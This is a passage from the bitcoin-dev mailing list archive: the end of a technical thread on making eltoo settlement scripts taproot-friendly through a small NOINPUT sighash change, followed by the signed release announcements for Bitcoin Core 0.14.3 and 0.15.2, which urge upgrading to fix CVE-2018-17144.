>>> hashSequence so that its behaviour is consistent with ANYONECANPAY?
>>
>> There is a good reason for not doing that. If NOINPUT would sign the
>> hashSequence then it would be possible to get rid of OP_CSV in eltoo update
>> scripts. As a result update scripts could be taprootified because the more
>> common branch (settlement) would be just a 2-of-2 multisig. Applying taproot
>> would then make unilateral settlement look like a single pubkey spend and avoid
>> having to reveal the unexecuted (update) branch.
>>
>> Eltoo update transaction outputs consist of two branches, update and
>> settlement, where the update branch can be spend by a more recent update
>> transaction if an obsolete update transaction ends up spending the funding
>> output. The settlement branch is a 2-of-2 multisig with a relative timelock
>> using OP_CSV. Removing OP_CSV is possible because both parties signature is
>> required to spend the update transaction. They will only sign if the input has
>> the right sequence numbers which is sufficient to enforce the timeout (BIP68) -
>> assuming they are covered by the signature.
>>
>> There's a catch: hashSequence includes the sequence numbers of all transaction
>> inputs. That's not a problem for eltoo because settlement transactions only
>> have one input. The update mechanism with update transactions relies on being
>> able to bump the fee by unilaterally adding inputs and and change outputs to
>> the transaction. That's also not a problem because update spends do not use
>> relative timelocks and they are signed with SINGLE. So whenever NOINPUT is
>> combined SINGLE the hashSequence should be zeroed. This is in fact what a
>> minimal change to the current NOINPUT implementation would naturally do (see
>> below). However, that's error-prone when using NOINPUT in other contexts so in
>> general it would be better if NOINPUT would only sign the sequence number of
>> the corresponding input.
>>
>> Another downside of this approach is that you can never rebind to an output
>> with an OP_CSV that requires a larger sequence number, unless you also sign
>> with SIGHASH_SINGLE. It's difficult to imagine application where this would be
>> an issue.
>>
>> This is the modification to the NOINPUT implementation
>> (https://github.com/cdecker/bitcoin/commits/noinput) which makes eltoo
>> unilateral closes taprootifiable:
>> +++ b/src/script/interpreter.cpp
>> @@ -1223,7 +1223,7 @@ uint256 SignatureHash(const CScript& scriptCode, const CTransaction& txTo, unsig
>>             hashPrevouts = cacheready ? cache->hashPrevouts : GetPrevoutHash(txTo);
>>         }
>>
>> -        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE && !noinput) {
>> +        if (!(nHashType & SIGHASH_ANYONECANPAY) && (nHashType & 0x1f) != SIGHASH_SINGLE && (nHashType & 0x1f) != SIGHASH_NONE) {
>>             hashSequence = cacheready ? cache->hashSequence : GetSequenceHash(txTo);
>>         }
>>
>> On 5/1/18 4:58 PM, Russell O'Connor via bitcoin-dev wrote:
>>> At the risk of bikeshedding, shouldn't NOINPUT also zero out the
>>> hashSequence so that its behaviour is consistent with ANYONECANPAY?
>>>
>>
> 
> 

From laanwj at gmail.com  Fri Sep 28 15:37:28 2018
From: laanwj at gmail.com (Wladimir J. van der Laan)
Date: Fri, 28 Sep 2018 17:37:28 +0200
Subject: [bitcoin-dev] Bitcoin Core 0.14.3 released
Message-ID: <20180928153728.owm2nyxizhkbtcb6@aurora.visucore.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Bitcoin Core version *0.14.3* is now available from:

  <https://bitcoincore.org/bin/bitcoin-core-0.14.3/>

or through bitorrent:

  magnet:?xt=urn:btih:171edf5f51820900f24fc72620deaa07ee497dee&dn=bitcoin-core-0.14.3&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fexplodie.org%3A6969

This is a new minor version release, including various bugfixes and
performance improvements.

Please report bugs using the issue tracker at github:

  <https://github.com/bitcoin/bitcoin/issues>

To receive security and update notifications, please subscribe to:

  <https://bitcoincore.org/en/list/announcements/join/>

Compatibility
==============

Bitcoin Core is extensively tested on multiple operating systems using
the Linux kernel, macOS 10.8+, and Windows Vista and later.

Microsoft ended support for Windows XP on [April 8th, 2014](https://www.microsoft.com/en-us/WindowsForBusiness/end-of-xp-support),
No attempt is made to prevent installing or running the software on Windows XP, you
can still do so at your own risk but be aware that there are known instabilities and issues.
Please do not report issues about Windows XP to the issue tracker.

Bitcoin Core should also work on most other Unix-like systems but is not
frequently tested on them.

Notable changes
===============

Denial-of-Service vulnerability CVE-2018-17144
 -------------------------------

A denial-of-service vulnerability exploitable by miners has been discovered in
Bitcoin Core versions 0.14.0 up to 0.16.2. It is recommended to upgrade any of
the vulnerable versions to 0.14.3, 0.15.2 or 0.16.3 as soon as possible.

Known Bugs
==========

Since 0.14.0 the approximate transaction fee shown in Bitcoin-Qt when using coin
control and smart fee estimation does not reflect any change in target from the
smart fee slider. It will only present an approximate fee calculated using the
default target. The fee calculated using the correct target is still applied to
the transaction and shown in the final send confirmation dialog.

0.14.3 Change log
=================

Detailed release notes follow. This overview includes changes that affect
behavior, not code moves, refactors and string updates. For convenience in locating
the code changes and accompanying discussion, both the pull request and
git merge commit are mentioned.

### Consensus
- - #14247 `52965fb` Fix crash bug with duplicate inputs within a transaction (TheBlueMatt, sdaftuar)
 
### RPC and other APIs

- - #10445 `87a21d5` Fix: make CCoinsViewDbCursor::Seek work for missing keys (Pieter Wuille, Gregory Maxwell)
- - #9853 Return correct error codes in setban(), fundrawtransaction(), removeprunedfunds(), bumpfee(), blockchain.cpp (John Newbery)


### P2P protocol and network code

- - #10234 `d289b56` [net] listbanned RPC and QT should show correct banned subnets (John Newbery)

### Build system


### Miscellaneous

- - #10451 `3612219` contrib/init/bitcoind.openrcconf: Don't disable wallet by default (Luke Dashjr)
- - #10250 `e23cef0` Fix some empty vector references (Pieter Wuille)
- - #10196 `d28d583` PrioritiseTransaction updates the mempool tx counter (Suhas Daftuar)
- - #9497 `e207342` Fix CCheckQueue IsIdle (potential) race condition and remove dangerous constructors. (Jeremy Rubin)

### GUI

- - #9481 `7abe7bb` Give fallback fee a reasonable indent (Luke Dashjr)
- - #9481 `3e4d7bf` Qt/Send: Figure a decent warning colour from theme (Luke Dashjr)
- - #9481 `e207342` Show more significant warning if we fall back to the default fee (Jonas Schnelli)

### Wallet

- - #10308 `28b8b8b` Securely erase potentially sensitive keys/values (tjps)
- - #10265 `ff13f59` Make sure pindex is non-null before possibly referencing in LogPrintf call. (Karl-Johan Alm)

Credits
=======

Thanks to everyone who directly contributed to this release:

- - Cory Fields
- - CryptAxe
- - fanquake
- - Jeremy Rubin
- - John Newbery
- - Jonas Schnelli
- - Gregory Maxwell
- - Karl-Johan Alm
- - Luke Dashjr
- - MarcoFalke
- - Matt Corallo
- - Mikerah
- - Pieter Wuille
- - practicalswift
- - Suhas Daftuar
- - Thomas Snider
- - Tjps
- - Wladimir J. van der Laan

And to those that reported security issues:

- - awemany (for CVE-2018-17144, previously credited as "anonymous reporter")

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEnerg3HBjJJ+wVHRoHkrtYphs0l0FAluuSowACgkQHkrtYphs
0l3XtggArfc/1tCcIunvUIyooq7nb27AwltySOBFCFH/R1v6mcSN6ZHAEKC3uBA6
WkhrGChV8XqNELKau7w1riubPjMHNTj0k4+DBtaDNN41EAF+1bhHWbxQ4006tZHb
WN2coxX+iNPI9uj3m0MnbulZpy+c7w1azO8eULcZjkqkccRBl6p4Y3uePr7CbbKU
/h517ziI7UwYChKsF3tC7CX+3vDi7oyfZd5QCKmtEFicS4j0UADtsLdF2GlMkpyD
yffAq/jpDXrIMWXrseZe60UPTijaA2mokk8/SdGy0hKn9Qx/VB0EIYKVPMD4gDUg
iSFcmsELYzBzk01Jg29GLzCbI7rQYw==
=MOiO
-----END PGP SIGNATURE-----

From laanwj at gmail.com  Fri Sep 28 15:38:34 2018
From: laanwj at gmail.com (Wladimir J. van der Laan)
Date: Fri, 28 Sep 2018 17:38:34 +0200
Subject: [bitcoin-dev] Bitcoin Core 0.15.2 released
Message-ID: <20180928153834.ain2wfwu4cfabf24@aurora.visucore.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Bitcoin Core version *0.15.2* is now available from:

  <https://bitcoincore.org/bin/bitcoin-core-0.15.2/>

or through bittorrent:

  magnet:?xt=urn:btih:c0a23591e04ce45dd6349f3abc34df948c45537c&dn=bitcoin-core-0.15.2&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Fzer0day.ch%3A1337&tr=udp%3A%2F%2Fexplodie.org%3A6969

This is a new minor version release, including various bugfixes and
performance improvements, as well as updated translations.

Please report bugs using the issue tracker at GitHub:

  <https://github.com/bitcoin/bitcoin/issues>

To receive security and update notifications, please subscribe to:

  <https://bitcoincore.org/en/list/announcements/join/>

How to Upgrade
==============

If you are running an older version, shut it down. Wait until it has completely
shut down (which might take a few minutes for older versions), then run the 
installer (on Windows) or just copy over `/Applications/Bitcoin-Qt` (on Mac)
or `bitcoind`/`bitcoin-qt` (on Linux).

The first time you run version 0.15.0 or higher, your chainstate database will
be converted to a new format, which will take anywhere from a few minutes to
half an hour, depending on the speed of your machine.

The file format of `fee_estimates.dat` changed in version 0.15.0. Hence, a
downgrade from version 0.15 or upgrade to version 0.15 will cause all fee
estimates to be discarded.

Note that the block database format also changed in version 0.8.0 and there is no
automatic upgrade code from before version 0.8 to version 0.15.0. Upgrading
directly from 0.7.x and earlier without redownloading the blockchain is not supported.
However, as usual, old wallet versions are still supported.

Downgrading warning
- -------------------

The chainstate database for this release is not compatible with previous
releases, so if you run 0.15 and then decide to switch back to any
older version, you will need to run the old release with the `-reindex-chainstate`
option to rebuild the chainstate data structures in the old format.

If your node has pruning enabled, this will entail re-downloading and
processing the entire blockchain.

Compatibility
==============

Bitcoin Core is extensively tested on multiple operating systems using
the Linux kernel, macOS 10.8+, and Windows Vista and later. Windows XP is not supported.

Bitcoin Core should also work on most other Unix-like systems but is not
frequently tested on them.


Notable changes
===============

Denial-of-Service vulnerability CVE-2018-17144
- -------------------------------

A denial-of-service vulnerability exploitable by miners has been discovered in
Bitcoin Core versions 0.14.0 up to 0.16.2. It is recommended to upgrade any of
the vulnerable versions to 0.15.2 or 0.16.3 as soon as possible.

0.15.2 Change log
=================

### Build system

- - #11995 `9bb1a16` depends: Fix Qt build with XCode 9.2(fanquake)
- - #12946 `93b9a61` depends: Fix Qt build with XCode 9.3(fanquake)
- - #13544 `9fd3e00` depends: Update Qt download url (fanquake)
- - #11847 `cb7ef31` Make boost::multi_index comparators const (sdaftuar)

### Consensus
- - #14247 `4b8a3f5` Fix crash bug with duplicate inputs within a transaction (TheBlueMatt, sdaftuar)
 
### RPC
- - #11676 `7af2457` contrib/init: Update openrc-run filename (Luke Dashjr)
- - #11277 `7026845` Fix uninitialized URI in batch RPC requests (Russell Yanofsky)
 
### Wallet
- - #11289 `3f1db56` Wrap dumpwallet warning and note scripts aren't dumped (MeshCollider)
- - #11289 `42ea47d` Add wallet backup text to import*, add* and dumpwallet RPCs (MeshCollider)
- - #11590 `6372a75` [Wallet] always show help-line of wallet encryption calls (Jonas Schnelli)

### bitcoin-tx

- - #11554 `a69cc07` Sanity-check script sizes in bitcoin-tx (TheBlueMatt)

### Tests
- - #11277 `3a6cdd4` Add test for multiwallet batch RPC calls (Russell Yanofsky)
- - #11647 `1c8c7f8` Add missing batch rpc calls to python coverage logs (Russell Yanofsky)
- - #11277 `1036c43` Add missing multiwallet rpc calls to python coverage logs (Russell Yanofsky)
- - #11277 `305f768` Limit AuthServiceProxyWrapper.\_\_getattr\_\_ wrapping (Russell Yanofsky)
- - #11277 `2eea279` Make AuthServiceProxy.\_batch method usable (Russell Yanofsky)

Credits
=======

Thanks to everyone who directly contributed to this release:

- - fanquake
- - Jonas Schnelli
- - Luke Dashjr
- - Matt Corallo
- - MeshCollider
- - Russell Yanofsky
- - Suhas Daftuar
- - Wladimir J. van der Laan

And to those that reported security issues:

- - awemany (for CVE-2018-17144, previously credited as "anonymous reporter")

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEnerg3HBjJJ+wVHRoHkrtYphs0l0FAluuSdQACgkQHkrtYphs
0l30rwgApv6HCvWRnKCfoXTYjIFaBXoxFU8/SPlms/3YYvc5JF8/+DeVXfYgd1nW
Mgw1j0I3m52Am5JmV368uSpbfQYoUSUkWuZX62al9AXC8EBEbqPBWkeIJgvD3cpS
vZC3kpwphR7jS7Rt7HK1+IZl6sgA9iGD2ZlWZ2AjRdUM3/GZ0RrziMG7IVLeG0oh
CjUDqle4Ws/YyvSNcbLHWKzwW+bHmihVm4Xy+h9086tM11t9EkN0m3i5YoELipjW
keYX/y8a43wbzE15DX7bJNRJjjITLty0rQxxWuMvoHOix4xvDs1UYiYxtfoYSOnf
uqh1/mCkDwF7hiFb0ZxcgXdw3W2WoA==
=b4Fn
-----END PGP SIGNATURE-----

